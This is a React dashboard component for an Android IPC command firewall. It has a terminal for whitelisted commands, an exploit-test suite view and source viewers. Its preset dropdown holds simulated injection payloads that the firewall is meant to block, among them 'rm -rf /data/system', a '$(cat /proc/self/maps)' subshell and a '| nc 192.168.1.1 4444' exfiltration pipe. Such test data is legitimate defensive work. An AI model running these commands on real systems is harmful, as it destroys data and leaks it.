import React, { useState, useEffect } from 'react';
import {
  ShieldAlert,
  Terminal,
  Cpu,
  Lock,
  Flame,
  CheckCircle2,
  AlertTriangle,
  FileCode,
  Copy,
  Check,
  RefreshCw,
  Zap,
  Play,
  Layers,
  Server,
  KeyRound,
  FileCheck,
  Send,
  Sliders,
  ShieldCheck,
  EyeOff,
  Activity,
  Binary
} from 'lucide-react';
import { IPCStatsDTO, IPCCommandResponseDTO, ExploitTestCaseDTO } from '../types';

export const NativeIPCFirewallExplorer: React.FC = () => {
  const [activeSubTab, setActiveSubTab] = useState<'terminal' | 'exploit_suite' | 'architecture' | 'cpp_source' | 'py_source' | 'cli_trace'>('terminal');

  // IPC Status & Metrics
  const [stats, setStats] = useState<IPCStatsDTO | null>(null);
  const [whitelistMap, setWhitelistMap] = useState<Record<string, { desc: string; sampleOutput: any }>>({});
  const [loading, setLoading] = useState<boolean>(false);

  // Command Execution State
  const [selectedPreset, setSelectedPreset] = useState<string>('get_device_telemetry');
  const [customCommand, setCustomCommand] = useState<string>('get_device_telemetry');
  const [callerUid, setCallerUid] = useState<number>(10001);
  const [corruptCanary, setCorruptCanary] = useState<boolean>(false);
  const [isExecuting, setIsExecuting] = useState<boolean>(false);
  const [commandResponse, setCommandResponse] = useState<IPCCommandResponseDTO | null>(null);

  // Exploit Suite State
  const [exploitTests, setExploitTests] = useState<ExploitTestCaseDTO[]>([]);
  const [runningExploits, setRunningExploits] = useState<boolean>(false);

  // Code Viewers
  const [cppHeader, setCppHeader] = useState<string>('');
  const [cppSource, setCppSource] = useState<string>('');
  const [pySource, setPySource] = useState<string>('');
  const [copiedCode, setCopiedCode] = useState<string | null>(null);

  // CLI Trace
  const [cliLogs, setCliLogs] = useState<string[]>([]);
  const [isRunningCli, setIsRunningCli] = useState<boolean>(false);

  const fetchIPCStatus = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/ipc/status');
      const data = await res.json();
      if (data.success) {
        setStats(data.stats);
        setWhitelistMap(data.whitelist);
      }
    } catch (err) {
      console.error('Failed to load IPC status:', err);
    } finally {
      setLoading(false);
    }
  };

  const fetchExploitTests = async () => {
    setRunningExploits(true);
    try {
      const res = await fetch('/api/ipc/exploit-tests');
      const data = await res.json();
      if (data.success) {
        setExploitTests(data.tests);
      }
    } catch (err) {
      console.error('Failed to fetch exploit tests:', err);
    } finally {
      setRunningExploits(false);
    }
  };

  useEffect(() => {
    fetchIPCStatus();
    fetchExploitTests();

    fetch('/api/ipc/cpp-source')
      .then((res) => res.json())
      .then((data) => {
        if (data.success) {
          setCppHeader(data.header);
          setCppSource(data.source);
        }
      })
      .catch((err) => console.error('Failed to fetch C++ source:', err));

    fetch('/api/ipc/python-source')
      .then((res) => res.json())
      .then((data) => {
        if (data.success) {
          setPySource(data.code);
        }
      })
      .catch((err) => console.error('Failed to fetch Python source:', err));
  }, []);

  const handleSendCommand = async () => {
    setIsExecuting(true);
    setCommandResponse(null);
    try {
      const res = await fetch('/api/ipc/send-command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          rawCommand: customCommand,
          callerUid,
          simulateCanaryCorruption: corruptCanary
        })
      });
      const data = await res.json();
      setCommandResponse(data);
      fetchIPCStatus();
    } catch (err) {
      console.error('Failed to send command:', err);
    } finally {
      setIsExecuting(false);
    }
  };

  const handleRunCliTest = async () => {
    setIsRunningCli(true);
    try {
      const res = await fetch('/api/ipc/run-cli-test', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      });
      const data = await res.json();
      if (data.success && data.logs) {
        setCliLogs(data.logs);
      }
    } catch (err) {
      console.error('Failed to run IPC CLI test:', err);
    } finally {
      setIsRunningCli(false);
    }
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCode(label);
    setTimeout(() => setCopiedCode(null), 2000);
  };

  return (
    <div id="native-ipc-firewall-container" className="space-y-6">
      {/* Top Header Banner */}
      <div className="bg-gradient-to-r from-zinc-900 via-rose-950/30 to-zinc-900 border border-rose-500/30 rounded-xl p-6 shadow-xl relative overflow-hidden">
        <div className="absolute right-0 top-0 translate-x-12 -translate-y-12 w-96 h-96 bg-rose-500/10 rounded-full blur-3xl pointer-events-none" />

        <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-6 relative z-10">
          <div>
            <div className="flex items-center gap-2 mb-1.5 flex-wrap">
              <span className="px-2.5 py-0.5 text-xs font-mono font-medium uppercase bg-rose-500/20 text-rose-300 border border-rose-500/30 rounded-full">
                Prompt 10 Native IPC Engine &amp; NDK Memory Firewall
              </span>
              <span className="px-2.5 py-0.5 text-xs font-mono font-medium uppercase bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 rounded-full">
                AF_UNIX Domain Sockets
              </span>
              <span className="px-2.5 py-0.5 text-xs font-mono font-medium uppercase bg-amber-500/20 text-amber-300 border border-amber-500/30 rounded-full">
                8 KB Strict Memory Barrier
              </span>
            </div>
            <h2 className="text-2xl font-bold text-zinc-100 tracking-tight flex items-center gap-2.5">
              <Cpu className="w-7 h-7 text-rose-400" />
              Native IPC Engine &amp; NDK Memory Firewall
            </h2>
            <p className="text-sm text-zinc-400 max-w-3xl mt-1">
              Secure inter-process communication bridge connecting Python background workers and the Android system shell
              via isolated Unix Domain Sockets, strict metacharacter input sanitization, stack canary validation, and 8KB memory barriers.
            </p>
          </div>

          {/* Quick Metrics Cards */}
          <div className="flex items-center gap-3 flex-wrap">
            <div className="p-3 bg-zinc-950 border border-zinc-800 rounded-xl shadow-inner min-w-[130px]">
              <span className="text-[10px] text-zinc-500 block font-mono uppercase">Processed</span>
              <div className="text-lg font-bold text-rose-400 font-mono">
                {stats?.totalMessagesProcessed ?? 0}
              </div>
            </div>

            <div className="p-3 bg-zinc-950 border border-zinc-800 rounded-xl shadow-inner min-w-[130px]">
              <span className="text-[10px] text-zinc-500 block font-mono uppercase">Exploits Blocked</span>
              <div className="text-lg font-bold text-amber-400 font-mono">
                {stats?.exploitsIntercepted ?? 0}
              </div>
            </div>

            <button
              onClick={fetchIPCStatus}
              disabled={loading}
              className="p-3 rounded-xl bg-zinc-800 hover:bg-zinc-700 text-zinc-300 border border-zinc-700 transition"
              title="Refresh IPC Status"
            >
              <RefreshCw className={`w-5 h-5 ${loading ? 'animate-spin' : ''}`} />
            </button>
          </div>
        </div>

        {/* Sub-Navigation Tabs */}
        <div className="flex items-center gap-2 mt-6 border-t border-zinc-800 pt-4 overflow-x-auto">
          <button
            onClick={() => setActiveSubTab('terminal')}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-2 whitespace-nowrap ${
              activeSubTab === 'terminal'
                ? 'bg-rose-600 text-white shadow-sm'
                : 'bg-zinc-800/80 text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800'
            }`}
          >
            <Terminal className="w-3.5 h-3.5" />
            Interactive IPC Terminal &amp; Framer
          </button>

          <button
            onClick={() => setActiveSubTab('exploit_suite')}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-2 whitespace-nowrap ${
              activeSubTab === 'exploit_suite'
                ? 'bg-rose-600 text-white shadow-sm'
                : 'bg-zinc-800/80 text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800'
            }`}
          >
            <ShieldAlert className="w-3.5 h-3.5" />
            Exploit Mitigation Defense Suite ({exploitTests.length})
          </button>

          <button
            onClick={() => setActiveSubTab('architecture')}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-2 whitespace-nowrap ${
              activeSubTab === 'architecture'
                ? 'bg-rose-600 text-white shadow-sm'
                : 'bg-zinc-800/80 text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800'
            }`}
          >
            <Layers className="w-3.5 h-3.5" />
            Unix Domain Socket Architecture
          </button>

          <button
            onClick={() => setActiveSubTab('cpp_source')}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-2 whitespace-nowrap ${
              activeSubTab === 'cpp_source'
                ? 'bg-rose-600 text-white shadow-sm'
                : 'bg-zinc-800/80 text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800'
            }`}
          >
            <FileCode className="w-3.5 h-3.5" />
            C++ NDK Engine (ndk_ipc_firewall.cpp)
          </button>

          <button
            onClick={() => setActiveSubTab('py_source')}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-2 whitespace-nowrap ${
              activeSubTab === 'py_source'
                ? 'bg-rose-600 text-white shadow-sm'
                : 'bg-zinc-800/80 text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800'
            }`}
          >
            <Binary className="w-3.5 h-3.5" />
            Python Wrapper (native_ipc_firewall.py)
          </button>

          <button
            onClick={() => {
              setActiveSubTab('cli_trace');
              if (cliLogs.length === 0) handleRunCliTest();
            }}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-2 whitespace-nowrap ${
              activeSubTab === 'cli_trace'
                ? 'bg-rose-600 text-white shadow-sm'
                : 'bg-zinc-800/80 text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800'
            }`}
          >
            <Terminal className="w-3.5 h-3.5" />
            NDK Engine CLI Trace
          </button>
        </div>
      </div>

      {/* SUB-TAB 1: INTERACTIVE IPC TERMINAL & FRAMER */}
      {activeSubTab === 'terminal' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Command Sender Form */}
            <div className="lg:col-span-5 space-y-4">
              <div className="p-5 bg-zinc-900 border border-zinc-800 rounded-xl space-y-4 shadow-lg">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-zinc-200 uppercase tracking-wider flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-rose-400" />
                    Dispatch IPC Shell Message
                  </span>
                  <span className="text-[10px] text-zinc-500 font-mono">
                    AF_UNIX Socket
                  </span>
                </div>

                {/* Preset Commands Dropdown */}
                <div className="space-y-1.5">
                  <label className="text-xs text-zinc-400 block">Select Command Preset or Attack:</label>
                  <select
                    value={selectedPreset}
                    onChange={(e) => {
                      setSelectedPreset(e.target.value);
                      setCustomCommand(e.target.value);
                    }}
                    className="w-full bg-zinc-950 border border-zinc-700 rounded-lg px-3 py-2 text-xs text-zinc-200 font-mono outline-none"
                  >
                    <optgroup label="✅ Whitelisted Benign Commands">
                      <option value="get_device_telemetry">get_device_telemetry (CPU/RAM/Sensors)</option>
                      <option value="get_selinux_enforcing">get_selinux_enforcing (SELinux Context)</option>
                      <option value="query_keystore_attest">query_keystore_attest (TEE Hardware Attestation)</option>
                      <option value="check_memory_bounds">check_memory_bounds (Virtual Memory Map)</option>
                      <option value="get_network_interfaces">get_network_interfaces (Tor &amp; Network)</option>
                      <option value="trigger_secure_sync">trigger_secure_sync (Sync Audit Ledger)</option>
                      <option value="get_battery_thermal_state">get_battery_thermal_state (PMIC Thermals)</option>
                    </optgroup>
                    <optgroup label="⚠️ Simulated Exploit Injections (Will be Blocked)">
                      <option value="get_device_telemetry; rm -rf /data/system">Shell Semicolon Injection (; rm -rf)</option>
                      <option value="query_keystore_attest $(cat /proc/self/maps)">Subshell Injection ($(cat maps))</option>
                      <option value="get_device_telemetry\0/bin/sh">Null-Byte Poisoning (\0/bin/sh)</option>
                      <option value="/system/bin/su -c whoami">Unlisted Root Binary (/system/bin/su)</option>
                      <option value="trigger_secure_sync | nc 192.168.1.1 4444">Pipe Exfiltration (| nc ...)</option>
                    </optgroup>
                  </select>
                </div>

                {/* Raw Input Box */}
                <div className="space-y-1.5">
                  <label className="text-xs text-zinc-400 block">Raw Command String Payload:</label>
                  <input
                    type="text"
                    value={customCommand}
                    onChange={(e) => setCustomCommand(e.target.value)}
                    className="w-full bg-zinc-950 border border-zinc-700 rounded-lg px-3 py-2 text-xs text-zinc-200 font-mono outline-none placeholder:text-zinc-600"
                    placeholder="Enter command or injection string..."
                  />
                  <div className="text-[10px] text-zinc-500 font-mono flex justify-between">
                    <span>Length: {customCommand.length} bytes</span>
                    <span>Max Barrier: 1024 B Command / 8192 B Frame</span>
                  </div>
                </div>

                {/* Caller UID Simulator */}
                <div className="space-y-1.5">
                  <label className="text-xs text-zinc-400 block">Caller Peer Credentials (SO_PEERCRED UID):</label>
                  <select
                    value={callerUid}
                    onChange={(e) => setCallerUid(Number(e.target.value))}
                    className="w-full bg-zinc-950 border border-zinc-700 rounded-lg px-3 py-2 text-xs text-zinc-200 font-mono outline-none"
                  >
                    <option value={10001}>UID 10001 (Isolated App Sandbox Worker - Authorized)</option>
                    <option value={1000}>UID 1000 (System Service Daemon - Authorized)</option>
                    <option value={0}>UID 0 (Root Context - Authorized)</option>
                    <option value={9999}>UID 9999 (Malicious Rogue Sandbox - UNAUTHORIZED)</option>
                  </select>
                </div>

                {/* Canary Corruption Checkbox */}
                <div className="flex items-center gap-2 p-2.5 bg-zinc-950 rounded-lg border border-zinc-800">
                  <input
                    type="checkbox"
                    id="corrupt-canary"
                    checked={corruptCanary}
                    onChange={(e) => setCorruptCanary(e.target.checked)}
                    className="rounded text-rose-600 focus:ring-rose-500 bg-zinc-900 border-zinc-700"
                  />
                  <label htmlFor="corrupt-canary" className="text-xs text-zinc-300 cursor-pointer select-none">
                    Simulate Stack Canary Corruption (<span className="text-rose-400 font-mono">0x41414141</span>)
                  </label>
                </div>

                {/* Send Button */}
                <button
                  onClick={handleSendCommand}
                  disabled={isExecuting}
                  className="w-full py-2.5 bg-rose-600 hover:bg-rose-500 text-white font-bold text-xs rounded-xl shadow-md transition flex items-center justify-center gap-2"
                >
                  <Send className={`w-4 h-4 ${isExecuting ? 'animate-spin' : ''}`} />
                  {isExecuting ? 'Transmitting via AF_UNIX...' : 'Dispatch Frame to NDK Firewall'}
                </button>
              </div>
            </div>

            {/* Inspection & Results Area */}
            <div className="lg:col-span-7 space-y-4">
              {commandResponse ? (
                <div className="p-5 bg-zinc-900 border border-zinc-800 rounded-xl space-y-4 shadow-xl">
                  {/* Verdict Badge Header */}
                  <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
                    <div className="flex items-center gap-2.5">
                      {commandResponse.success ? (
                        <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                      ) : (
                        <AlertTriangle className="w-5 h-5 text-amber-400" />
                      )}
                      <div>
                        <h4 className="text-sm font-bold text-zinc-100">
                          {commandResponse.verdict === 'ALLOWED_AND_EXECUTED'
                            ? 'COMMAND VALIDATED & EXECUTED'
                            : 'INTERCEPTED & BLOCKED BY NDK FIREWALL'}
                        </h4>
                        <span className="text-[11px] text-zinc-500 font-mono">
                          Error Code: {commandResponse.errorCode} • Latency: {commandResponse.executionTimeMs ?? 0} ms
                        </span>
                      </div>
                    </div>

                    <span
                      className={`px-2.5 py-1 text-xs font-mono font-bold rounded-lg border ${
                        commandResponse.success
                          ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                          : 'bg-rose-500/20 text-rose-300 border-rose-500/40'
                      }`}
                    >
                      {commandResponse.verdict}
                    </span>
                  </div>

                  {/* Error Message if Blocked */}
                  {!commandResponse.success && (
                    <div className="p-3 bg-rose-950/40 border border-rose-500/40 rounded-lg text-xs font-mono text-rose-300">
                      <strong>Security Interception:</strong> {commandResponse.errorMessage}
                    </div>
                  )}

                  {/* Sandboxed Execution Output */}
                  {commandResponse.output && (
                    <div className="space-y-1.5">
                      <span className="text-xs font-mono text-zinc-400 block font-bold">
                        Sandboxed Output Data (Non-Shell execve):
                      </span>
                      <pre className="p-3 bg-zinc-950 border border-zinc-800 rounded-lg text-xs font-mono text-emerald-300 overflow-x-auto max-h-48">
                        {JSON.stringify(commandResponse.output, null, 2)}
                      </pre>
                    </div>
                  )}

                  {/* Binary TLV Packet Framing Inspector */}
                  {commandResponse.tlvFrame && (
                    <div className="space-y-2 pt-2 border-t border-zinc-800">
                      <span className="text-xs font-mono font-bold text-zinc-300 uppercase block flex items-center gap-1.5">
                        <Binary className="w-4 h-4 text-rose-400" />
                        Binary TLV Message Frame Inspector (NDK Memory Layout)
                      </span>

                      <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[11px] font-mono">
                        <div className="p-2 bg-zinc-950 rounded border border-zinc-800">
                          <span className="text-zinc-500 block">Magic (4B)</span>
                          <strong className="text-rose-300">{commandResponse.tlvFrame.magicHex}</strong>
                        </div>
                        <div className="p-2 bg-zinc-950 rounded border border-zinc-800">
                          <span className="text-zinc-500 block">Version (2B)</span>
                          <strong className="text-zinc-200">{commandResponse.tlvFrame.versionHex}</strong>
                        </div>
                        <div className="p-2 bg-zinc-950 rounded border border-zinc-800">
                          <span className="text-zinc-500 block">Sequence (4B)</span>
                          <strong className="text-indigo-300">#{commandResponse.tlvFrame.sequenceId}</strong>
                        </div>
                        <div className="p-2 bg-zinc-950 rounded border border-zinc-800">
                          <span className="text-zinc-500 block">Payload (NB)</span>
                          <strong className="text-emerald-300">{commandResponse.tlvFrame.payloadLengthBytes} Bytes</strong>
                        </div>
                        <div className="p-2 bg-zinc-950 rounded border border-zinc-800">
                          <span className="text-zinc-500 block">Head Canary</span>
                          <strong className="text-amber-300">{commandResponse.tlvFrame.headerCanary}</strong>
                        </div>
                        <div className="p-2 bg-zinc-950 rounded border border-zinc-800">
                          <span className="text-zinc-500 block">Tail Canary</span>
                          <strong className="text-amber-300">{commandResponse.tlvFrame.tailCanary}</strong>
                        </div>
                        <div className="p-2 bg-zinc-950 rounded border border-zinc-800 col-span-2">
                          <span className="text-zinc-500 block">Anti-Replay Nonce (8B)</span>
                          <strong className="text-purple-300 truncate block">{commandResponse.tlvFrame.nonceHex}</strong>
                        </div>
                      </div>

                      <div className="p-2.5 bg-zinc-950 rounded border border-zinc-800 text-[11px] font-mono">
                        <span className="text-zinc-500 block">HMAC-SHA256 Frame Signature (32B):</span>
                        <div className="text-purple-400 break-all">{commandResponse.tlvFrame.hmacSignatureSha256}</div>
                      </div>
                    </div>
                  )}
                </div>
              ) : (
                <div className="p-8 bg-zinc-900 border border-zinc-800 rounded-xl text-center space-y-2">
                  <Terminal className="w-10 h-10 text-zinc-600 mx-auto" />
                  <h4 className="text-sm font-bold text-zinc-300">IPC Socket Terminal Ready</h4>
                  <p className="text-xs text-zinc-500 max-w-sm mx-auto">
                    Select a whitelisted command or simulate an exploit attack on the left and click &quot;Dispatch Frame to NDK Firewall&quot; to inspect real-time sanitization and binary framing.
                  </p>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* SUB-TAB 2: EXPLOIT MITIGATION DEFENSE SUITE */}
      {activeSubTab === 'exploit_suite' && (
        <div className="space-y-6">
          <div className="p-6 bg-zinc-900 border border-zinc-800 rounded-xl space-y-4 shadow-xl">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div>
                <h3 className="text-base font-bold text-zinc-100 flex items-center gap-2">
                  <ShieldAlert className="w-5 h-5 text-rose-400" />
                  Automated Exploit Mitigation &amp; Attack Verification Suite
                </h3>
                <p className="text-xs text-zinc-400 mt-1">
                  Executes 8 distinct exploit vectors (Buffer overflow, command injection, subshell substitution, null-byte poisoning, UID bypass, stack canary corruption) against the NDK memory firewall.
                </p>
              </div>

              <button
                onClick={fetchExploitTests}
                disabled={runningExploits}
                className="px-4 py-2 bg-rose-600 hover:bg-rose-500 text-white text-xs font-bold rounded-xl shadow transition flex items-center gap-2"
              >
                <RefreshCw className={`w-4 h-4 ${runningExploits ? 'animate-spin' : ''}`} />
                {runningExploits ? 'Testing Exploit Defenses...' : 'Re-Run All Exploit Tests'}
              </button>
            </div>

            {/* Test Cards Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
              {exploitTests.map((t) => (
                <div
                  key={t.id}
                  className="p-4 bg-zinc-950 border border-zinc-800 rounded-xl space-y-2.5 shadow-md"
                >
                  <div className="flex items-center justify-between flex-wrap gap-2">
                    <span className="font-bold text-xs text-zinc-200 flex items-center gap-1.5">
                      {t.verdict === 'BLOCKED' ? (
                        <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                      ) : (
                        <ShieldCheck className="w-4 h-4 text-blue-400" />
                      )}
                      {t.name}
                    </span>
                    <span
                      className={`px-2 py-0.5 text-[10px] font-mono font-bold uppercase rounded border ${
                        t.verdict === 'BLOCKED'
                          ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                          : 'bg-blue-500/20 text-blue-300 border-blue-500/40'
                      }`}
                    >
                      {t.verdict === 'BLOCKED' ? 'ATTACK BLOCKED' : 'ALLOWED (BENIGN)'}
                    </span>
                  </div>

                  <p className="text-xs text-zinc-400">{t.description}</p>

                  <div className="p-2 bg-zinc-900 rounded border border-zinc-800 text-[11px] font-mono space-y-1">
                    <div className="text-zinc-500">
                      Payload: <span className="text-rose-300 break-all">{t.payload.length > 60 ? t.payload.substring(0, 60) + '...' : t.payload}</span>
                    </div>
                    <div className="text-zinc-500">
                      Defense: <span className="text-indigo-300">{t.defenseMechanism}</span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* SUB-TAB 3: ARCHITECTURE & MEMORY BOUNDARIES */}
      {activeSubTab === 'architecture' && (
        <div className="p-6 bg-zinc-900 border border-zinc-800 rounded-xl space-y-6 shadow-xl">
          <div>
            <h3 className="text-base font-bold text-zinc-100 flex items-center gap-2">
              <Layers className="w-5 h-5 text-rose-400" />
              Android NDK IPC &amp; Memory Isolation Architecture
            </h3>
            <p className="text-xs text-zinc-400 mt-1">
              Multi-tiered defense-in-depth model isolating Python background workers from the Android root shell.
            </p>
          </div>

          {/* Architecture Pipeline Flow */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-3 font-mono text-xs">
            <div className="p-4 bg-zinc-950 border border-indigo-500/30 rounded-xl space-y-2">
              <span className="px-2 py-0.5 text-[10px] uppercase bg-indigo-500/20 text-indigo-300 rounded font-bold">Tier 1: Client</span>
              <h4 className="font-bold text-zinc-200 text-sm">Python Background Worker</h4>
              <p className="text-zinc-400 text-[11px]">
                Marshals request into binary TLV format with random nonce and HMAC-SHA256 tail.
              </p>
            </div>

            <div className="p-4 bg-zinc-950 border border-rose-500/30 rounded-xl space-y-2">
              <span className="px-2 py-0.5 text-[10px] uppercase bg-rose-500/20 text-rose-300 rounded font-bold">Tier 2: Transport</span>
              <h4 className="font-bold text-zinc-200 text-sm">AF_UNIX Domain Socket</h4>
              <p className="text-zinc-400 text-[11px]">
                Enforces SO_PEERCRED UID isolation. Abstract namespace: <span className="text-rose-400">@ai_secure_ipc_firewall.sock</span>.
              </p>
            </div>

            <div className="p-4 bg-zinc-950 border border-amber-500/30 rounded-xl space-y-2">
              <span className="px-2 py-0.5 text-[10px] uppercase bg-amber-500/20 text-amber-300 rounded font-bold">Tier 3: NDK Barrier</span>
              <h4 className="font-bold text-zinc-200 text-sm">Memory Firewall (C++)</h4>
              <p className="text-zinc-400 text-[11px]">
                Validates 8KB limit, checks 0xDEADBEEF canaries, sanitizes metacharacters, and checks whitelist.
              </p>
            </div>

            <div className="p-4 bg-zinc-950 border border-emerald-500/30 rounded-xl space-y-2">
              <span className="px-2 py-0.5 text-[10px] uppercase bg-emerald-500/20 text-emerald-300 rounded font-bold">Tier 4: Target</span>
              <h4 className="font-bold text-zinc-200 text-sm">Sandboxed Subprocess</h4>
              <p className="text-zinc-400 text-[11px]">
                Executes via <span className="text-emerald-400">execve(argv[])</span> with zero shell interpretation or wildcard expansion.
              </p>
            </div>
          </div>

          {/* Memory Framing Spec Card */}
          <div className="p-4 bg-zinc-950 border border-zinc-800 rounded-xl space-y-3">
            <span className="text-xs font-mono font-bold text-zinc-300 uppercase block">
              Binary TLV Memory Layout Specification (pragma pack(1))
            </span>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs font-mono">
              <div className="p-3 bg-zinc-900 rounded border border-zinc-800 space-y-1">
                <strong className="text-rose-300 block">Header Block (36 Bytes)</strong>
                <div className="text-zinc-400 text-[11px]">Magic (4B) = 0x53454355 ('SECU')</div>
                <div className="text-zinc-400 text-[11px]">Version (2B) + MsgType (2B)</div>
                <div className="text-zinc-400 text-[11px]">Sequence (4B) + PayloadLen (4B)</div>
                <div className="text-zinc-400 text-[11px]">Timestamp (8B) + Nonce (8B)</div>
                <div className="text-amber-400 text-[11px]">Header Canary (4B) = 0xDEADBEEF</div>
              </div>

              <div className="p-3 bg-zinc-900 rounded border border-zinc-800 space-y-1">
                <strong className="text-indigo-300 block">Dynamic Payload (0 - 8192 Bytes)</strong>
                <div className="text-zinc-400 text-[11px]">Strict 8 KB Memory Limit Barrier</div>
                <div className="text-zinc-400 text-[11px]">Null-byte scanner rejection</div>
                <div className="text-zinc-400 text-[11px]">Regex metacharacter validation</div>
                <div className="text-zinc-400 text-[11px]">Safe argv array tokenization</div>
              </div>

              <div className="p-3 bg-zinc-900 rounded border border-zinc-800 space-y-1">
                <strong className="text-purple-300 block">Tail Block (36 Bytes)</strong>
                <div className="text-amber-400 text-[11px]">Tail Canary (4B) = 0xDEADBEEF</div>
                <div className="text-purple-400 text-[11px]">HMAC-SHA256 Signature (32B)</div>
                <div className="text-zinc-400 text-[11px]">Anti-tamper &amp; anti-replay seal</div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* SUB-TAB 4: C++ NDK SOURCE */}
      {activeSubTab === 'cpp_source' && (
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl overflow-hidden shadow-sm space-y-4 p-4">
          <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
            <div className="flex items-center gap-3">
              <FileCode className="w-5 h-5 text-rose-400" />
              <span className="text-xs font-mono font-bold text-zinc-200">/android/native/ndk_ipc_firewall.cpp &amp; .hpp</span>
            </div>
            <button
              onClick={() => copyToClipboard(cppHeader + '\n\n' + cppSource, 'cpp')}
              className="px-3 py-1.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 text-xs rounded font-medium flex items-center gap-1.5 transition cursor-pointer"
            >
              {copiedCode === 'cpp' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              {copiedCode === 'cpp' ? 'Copied' : 'Copy C++ Source'}
            </button>
          </div>

          <div className="p-4 bg-zinc-950 overflow-x-auto max-h-[580px] font-mono text-xs text-zinc-300 leading-relaxed rounded-lg">
            <pre className="text-zinc-300">
              {cppHeader ? `// ===================== HEADER: ndk_ipc_firewall.hpp =====================\n${cppHeader}\n\n// ===================== SOURCE: ndk_ipc_firewall.cpp =====================\n${cppSource}` : 'Loading C++ source...'}
            </pre>
          </div>
        </div>
      )}

      {/* SUB-TAB 5: PYTHON SOURCE */}
      {activeSubTab === 'py_source' && (
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl overflow-hidden shadow-sm space-y-4 p-4">
          <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
            <div className="flex items-center gap-3">
              <Binary className="w-5 h-5 text-rose-400" />
              <span className="text-xs font-mono font-bold text-zinc-200">/android/python/native_ipc_firewall.py</span>
            </div>
            <button
              onClick={() => copyToClipboard(pySource, 'py')}
              className="px-3 py-1.5 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 text-xs rounded font-medium flex items-center gap-1.5 transition cursor-pointer"
            >
              {copiedCode === 'py' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
              {copiedCode === 'py' ? 'Copied' : 'Copy Python Source'}
            </button>
          </div>

          <div className="p-4 bg-zinc-950 overflow-x-auto max-h-[580px] font-mono text-xs text-zinc-300 leading-relaxed rounded-lg">
            <pre className="text-zinc-300">
              {pySource || 'Loading Python source...'}
            </pre>
          </div>
        </div>
      )}

      {/* SUB-TAB 6: CLI TRACE */}
      {activeSubTab === 'cli_trace' && (
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl overflow-hidden shadow-sm">
          <div className="px-5 py-3.5 bg-zinc-950 border-b border-zinc-800 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Terminal className="w-5 h-5 text-rose-400" />
              <h3 className="text-xs font-mono font-bold text-zinc-200">Python CLI Output: python native_ipc_firewall.py</h3>
            </div>
            <button
              onClick={handleRunCliTest}
              disabled={isRunningCli}
              className="px-3 py-1.5 bg-rose-600 hover:bg-rose-500 text-white text-xs rounded font-medium flex items-center gap-1.5 transition cursor-pointer"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${isRunningCli ? 'animate-spin' : ''}`} />
              Run NDK Firewall CLI Test
            </button>
          </div>

          <div className="p-5 bg-zinc-950 font-mono text-xs space-y-2 text-zinc-300">
            {cliLogs.length > 0 ? (
              cliLogs.map((log, idx) => (
                <div key={idx} className="flex items-start gap-2">
                  <span className="text-rose-400 select-none">&gt;</span>
                  <span className={log.includes('PASSED') || log.includes('SUCCESSFULLY') ? 'text-emerald-400 font-semibold' : log.includes('BLOCKED') ? 'text-amber-300 font-semibold' : log.includes('Step') || log.includes('TEST') ? 'text-rose-300 font-semibold' : 'text-zinc-300'}>
                    {log}
                  </span>
                </div>
              ))
            ) : (
              <div className="text-zinc-500">Click &quot;Run NDK Firewall CLI Test&quot; to execute real-time exploit attack simulations, canary checks, and AF_UNIX domain socket verification.</div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
